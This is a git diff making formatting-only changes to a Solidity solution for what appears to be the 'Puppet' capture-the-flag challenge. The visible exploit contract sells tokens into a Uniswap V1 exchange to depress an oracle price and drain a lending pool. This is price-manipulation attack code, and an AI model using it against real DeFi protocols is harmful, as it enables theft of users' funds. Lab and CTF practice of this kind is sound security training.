@@ -92,7 +92,9 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        PuppetExploit exploit = new PuppetExploit{value: PLAYER_INITIAL_ETH_BALANCE}(address(token), address(lendingPool), address(uniswapV1Exchange), recovery);
+        PuppetExploit exploit = new PuppetExploit{value: PLAYER_INITIAL_ETH_BALANCE}(
+            address(token), address(lendingPool), address(uniswapV1Exchange), recovery
+        );
         token.transfer(address(exploit), PLAYER_INITIAL_TOKEN_BALANCE);
         exploit.attack(POOL_INITIAL_TOKEN_BALANCE);
     }
@@ -135,7 +137,7 @@ contract PuppetExploit {
     function attack(uint256 exploitAmount) public {
         uint256 tokenBalance = token.balanceOf(address(this));
         // sending dvt tokens to uniswap exchange, increasing their balance and lowering the price
-        // in turn we get eth 
+        // in turn we get eth
         token.approve(address(uniswapV1Exchange), tokenBalance);
 
         uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 1, block.timestamp, address(this));
